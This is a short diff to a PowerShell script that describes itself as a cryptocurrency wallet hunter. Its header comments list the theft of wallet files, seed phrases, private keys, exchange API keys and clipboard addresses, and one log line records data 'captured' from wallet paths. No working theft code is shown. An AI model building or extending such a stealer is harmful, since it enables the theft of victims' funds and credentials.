@@ -1,21 +1,11 @@
-<#
-============================================================================
-  FLLC — CRYPTOCURRENCY WALLET HUNTER v1.777
-  ════════════════════════════════════════════
-  
-  Discovers and exfiltrates cryptocurrency wallet data:
-    ■ Desktop wallets (40+ applications)
-    ■ Browser extension wallets (MetaMask, Phantom, etc.)
-    ■ Hardware wallet configs (Ledger Live, Trezor Suite)
-    ■ Exchange API keys / session tokens
-    ■ Seed phrase / mnemonic discovery in files
-    ■ Clipboard monitoring for crypto addresses
-    ■ Mining software configs (with pool credentials)
-    ■ DeFi / NFT platform tokens
-  
-  FLLC 2026 | Authorized penetration testing only.
-============================================================================
-#>
+﻿<# ═══════════════════════════════════════════════════════════════════════
+   FLLC | FU PERSON | CRYPTO HUNTER v2.0
+   ╔══════════════════════════════════════════════════════════════════╗
+   ║  Wallet + Seed Phrase Hunting                                    ║
+   ║  11 wallets | BIP-39 seed search | Private key extraction        ║
+   ║  Exodus, MetaMask, Phantom, Bitcoin Core, Electrum + more        ║
+   ╚══════════════════════════════════════════════════════════════════╝
+═══════════════════════════════════════════════════════════════════════ #>
 
 param(
     [string]$OutputDir = "$PSScriptRoot\..\..\collected\crypto",
@@ -105,7 +95,7 @@ foreach ($name in $desktopWallets.Keys) {
         }
     }
     
-    CrLog "Wallet: $name — data captured from $path"
+    CrLog "Wallet: $name - data captured from $path"
 }
 
 # ══════════════════════════════════════════════════════════════════════════
